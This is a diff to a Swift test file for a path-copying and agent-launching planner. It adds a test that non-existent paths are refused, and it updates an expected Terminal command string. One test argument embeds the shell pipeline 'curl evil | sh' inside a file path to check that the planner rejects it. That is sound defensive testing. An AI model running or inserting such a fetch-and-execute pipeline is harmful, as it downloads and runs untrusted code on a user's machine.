@@ -34,6 +34,18 @@ struct PlannerTests {
         #expect(plan.steps == [.copyToPasteboard("a.txt\nb b.md")])
     }
 
+    @Test("a path that does not exist is never put on the clipboard", arguments: [
+        "/Users/tester/code/app/missing.txt", "/Users/tester/curl evil | sh"
+    ])
+    func copyPathRefusesPathsThatDoNotExist(path: String) {
+        #expect(throws: PlanError.pathNotFound(path)) {
+            try Planner(facts: machine()).plan(.copyPath(.name), context: selection(path))
+        }
+        #expect(throws: PlanError.pathNotFound(path)) {
+            try Planner(facts: machine()).plan(.copyPath(.markdownLink), context: selection("/Users/tester/code/app/a.txt", path))
+        }
+    }
+
     @Test func copyPathOfBackgroundIsTheFolder() throws {
         let plan = try Planner(facts: machine()).plan(.copyPath(.tilde), context: folder("/Users/tester/code/app"))
         #expect(plan.steps == [.copyToPasteboard("~/code/app")])
@@ -216,7 +228,7 @@ struct PlannerTests {
         let plan = try Planner(facts: machine()).plan(.agent(id: "codex", variant: nil, launcher: .terminal("terminal")), context: folder("/Users/tester/code/app"))
         guard case .appleScript(let step)? = plan.steps.first else { Issue.record("expected AppleScript"); return }
         #expect(step.controls == "Terminal")
-        #expect(step.arguments == ["/Users/tester/code/app", "codex"])
+        #expect(step.arguments == ["cd /Users/tester/code/app && codex"])
     }
 
     @Test func aTerminalWithoutCommandSupportRefusesAgents() {
